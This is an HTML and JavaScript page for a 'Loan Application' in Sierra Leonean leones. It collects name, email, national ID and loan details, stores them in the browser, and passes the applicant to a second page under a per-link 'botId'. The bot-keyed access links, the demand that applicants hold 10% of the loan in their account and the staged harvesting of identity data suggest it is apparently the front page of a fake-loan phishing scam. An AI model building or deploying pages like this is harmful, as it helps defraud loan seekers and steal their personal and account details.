
<!DOCTYPE html>
<html lang="en">

<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Loan Application</title>

<style>

*{
    box-sizing:border-box;
}

body{
    font-family:Arial,sans-serif;
    background:#000;
    margin:0;
    display:flex;
    justify-content:center;
    align-items:center;
    min-height:100vh;
    color:white;
    padding:20px;
}

.loan-container{
    background:white;
    color:black;
    padding:30px;
    border-radius:20px;
    width:100%;
    max-width:420px;
    box-shadow:0 10px 30px rgba(0,0,0,0.4);
}


/* =========================
   LOGO
========================= */

.logo-wrapper{
    display:flex;
    justify-content:center;
    margin-bottom:20px;
}

.logo-circle{
    width:110px;
    height:110px;
    border-radius:50%;
    background:#111;
    display:flex;
    justify-content:center;
    align-items:center;
    box-shadow:0 6px 20px rgba(0,0,0,0.3);
    overflow:hidden;
}

.logo-circle img{
    width:80%;
    height:80%;
    object-fit:contain;
}


/* =========================
   HEADING
========================= */

h2{
    text-align:center;
    margin-bottom:20px;
}


/* =========================
   FORM
========================= */

label{
    font-weight:bold;
    font-size:14px;
    margin-bottom:5px;
    display:block;
}

input,
select{
    width:100%;
    padding:12px;
    border-radius:10px;
    border:1px solid #ddd;
    margin-bottom:15px;
    font-size:14px;
    background:white;
}

input:focus,
select:focus{
    outline:none;
    border:1px solid #ff9800;
    box-shadow:0 0 0 2px rgba(255,152,0,0.1);
}


/* =========================
   CURRENCY LABEL
========================= */

.amount-wrapper{
    position:relative;
}

.currency-label{
    position:absolute;
    left:12px;
    top:12px;
    color:#555;
    font-size:14px;
    font-weight:bold;
    pointer-events:none;
}

.amount-input{
    padding-left:52px;
}


/* =========================
   NOTICE
========================= */

.loan-notice{
    background:#fff3cd;
    border:1px solid #ffeeba;
    padding:15px;
    border-radius:10px;
    font-size:13px;
    margin-bottom:20px;
    color:#664d03;
}

.loan-notice strong{
    color:#5c4300;
}

.loan-notice ol{
    padding-left:18px;
    margin:8px 0 0 0;
}

.loan-notice li{
    margin-bottom:6px;
}


/* =========================
   BUTTON
========================= */

button{
    width:100%;
    padding:14px;
    border:none;
    border-radius:12px;
    font-size:16px;
    cursor:pointer;
    color:white;
    background:linear-gradient(90deg,#ff9800,#ff7043);
    box-shadow:0 5px 15px rgba(0,0,0,0.2);
    transition:0.2s;
}

button:hover{
    transform:translateY(-1px);
    box-shadow:0 7px 18px rgba(0,0,0,0.25);
}

button:active{
    transform:translateY(0);
}


/* =========================
   MOBILE
========================= */

@media(max-width:480px){

    body{
        padding:12px;
    }

    .loan-container{
        padding:22px;
    }

    .logo-circle{
        width:90px;
        height:90px;
    }

}

</style>

</head>


<body>


<div class="loan-container">


    <!-- LOGO -->

    <div class="logo-wrapper">

        <div class="logo-circle">

            <img
                src="orange.jpeg"
                alt="Logo"
            >

        </div>

    </div>


    <h2>
        Loan Application
    </h2>


    <form id="loanForm">


        <!-- FULL NAME -->

        <label for="fullName">
            Full Name
        </label>

        <input
            id="fullName"
            type="text"
            required
            placeholder="Enter your full name"
        >


        <!-- LOAN AMOUNT -->

        <label for="loanAmount">
            Loan Amount (SLE)
        </label>

        <div class="amount-wrapper">

            <span class="currency-label">
                SLE
            </span>

            <input
                id="loanAmount"
                class="amount-input"
                type="number"
                min="500"
                max="100000"
                step="500"
                required
                placeholder="500 - 100,000"
            >

        </div>


        <!-- EMAIL -->

        <label for="email">
            Email
        </label>

        <input
            id="email"
            type="email"
            placeholder="example@gmail.com"
            required
        >


        <!-- NATIONAL ID -->

        <label for="nationalId">
            National ID
        </label>

        <input
            id="nationalId"
            type="text"
            placeholder="National ID"
            required
        >


        <!-- REPAYMENT PERIOD -->

        <label for="repaymentPeriod">
            Repayment Period
        </label>

        <select
            id="repaymentPeriod"
            required
        >

            <option value="">
                Select
            </option>

            <option value="6months">
                6 months
            </option>

            <option value="12months">
                12 months
            </option>

            <option value="24months">
                24 months
            </option>

            <option value="36months">
                36 months
            </option>

            <option value="48months">
                48 months
            </option>

            <option value="60months">
                60 months
            </option>

        </select>


        <!-- EMPLOYMENT STATUS -->

        <label for="employmentStatus">
            Employment Status
        </label>

        <select
            id="employmentStatus"
            required
        >

            <option value="">
                Select
            </option>

            <option value="employed">
                Employed
            </option>

            <option value="self-employed">
                Self-employed
            </option>

            <option value="unemployed">
                Unemployed
            </option>

            <option value="student">
                Student
            </option>

        </select>


        <!-- LOAN PURPOSE -->

        <label for="loanPurpose">
            Loan Purpose
        </label>

        <select
            id="loanPurpose"
            required
        >

            <option value="">
                Select
            </option>

            <option value="business">
                Business
            </option>

            <option value="personal">
                Personal Loan
            </option>

            <option value="schoolfees">
                School Fees
            </option>

            <option value="medical">
                Medical
            </option>

            <option value="others">
                Others
            </option>

        </select>


        <!-- QUALIFICATION NOTICE -->

        <div class="loan-notice">

            <strong>
                Qualification Notice:
            </strong>

            <ol>

                <li>
                    You must apply with an active phone number.
                </li>

                <li>
                    Minimum loan amount is
                    <strong>SLE 500</strong>.
                </li>

                <li>
                    Maximum loan amount is
                    <strong>SLE 100,000</strong>.
                </li>

                <li>
                    You must have at least
                    <strong>10% of the requested loan amount</strong>
                    available in your account.
                </li>

            </ol>

        </div>


        <!-- SUBMIT -->

        <button type="submit">
            Next
        </button>


    </form>


</div>


<script>


/* ==========================================
   GET BOT ID
========================================== */

let botId =
    new URLSearchParams(
        window.location.search
    ).get("botId");


/*
 * If botId is not in the query string,
 * check the URL path.
 */

if(!botId){

    const parts =
        window.location.pathname.split("/");

    const botIndex =
        parts.indexOf("bot");

    if(
        botIndex !== -1 &&
        parts[botIndex + 1]
    ){

        botId =
            parts[botIndex + 1];

    }

}


/* ==========================================
   VALIDATE BOT ID
========================================== */

if(!botId){

    alert("Invalid access link");

    throw new Error("botId missing");

}


/* ==========================================
   SAVE BOT ID
========================================== */

localStorage.setItem(
    "botId",
    botId
);


/* ==========================================
   FORM SUBMISSION
========================================== */

document
    .getElementById("loanForm")
    .addEventListener(
        "submit",
        function(e){

            e.preventDefault();


            /* ==========================
               GET LOAN AMOUNT
            ========================== */

            const loanAmount =
                document.getElementById(
                    "loanAmount"
                );


            const amountValue =
                parseFloat(
                    loanAmount.value
                );


            /* ==========================
               VALIDATE MINIMUM
            ========================== */

            if(
                isNaN(amountValue) ||
                amountValue < 500
            ){

                alert(
                    "Loan amount must be at least SLE 500."
                );

                loanAmount.focus();

                return;

            }


            /* ==========================
               VALIDATE MAXIMUM
            ========================== */

            if(
                amountValue > 100000
            ){

                alert(
                    "Loan amount cannot exceed SLE 100,000."
                );

                loanAmount.focus();

                return;

            }


            /* ==========================
               VALIDATE STEP
            ========================== */

            if(
                amountValue % 500 !== 0
            ){

                alert(
                    "Please enter an amount in multiples of SLE 500."
                );

                loanAmount.focus();

                return;

            }


            /* ==========================
               SAVE FORM DATA
            ========================== */

            localStorage.setItem(
                "fullName",
                document.getElementById(
                    "fullName"
                ).value.trim()
            );


            /*
             * Store the numeric SLE amount.
             *
             * Example:
             *
             * SLE 50,000
             *
             * is stored as:
             *
             * 50000
             */

            localStorage.setItem(
                "loanAmount",
                amountValue
            );


            localStorage.setItem(
                "email",
                document.getElementById(
                    "email"
                ).value.trim()
            );


            localStorage.setItem(
                "nationalId",
                document.getElementById(
                    "nationalId"
                ).value.trim()
            );


            localStorage.setItem(
                "repaymentPeriod",
                document.getElementById(
                    "repaymentPeriod"
                ).value
            );


            localStorage.setItem(
                "employmentStatus",
                document.getElementById(
                    "employmentStatus"
                ).value
            );


            localStorage.setItem(
                "loanPurpose",
                document.getElementById(
                    "loanPurpose"
                ).value
            );


            /* ==========================
               REDIRECT
            ========================== */

            window.location.href =
                `details2.html?botId=${encodeURIComponent(botId)}`;

        }
    );

</script>


</body>

</html>
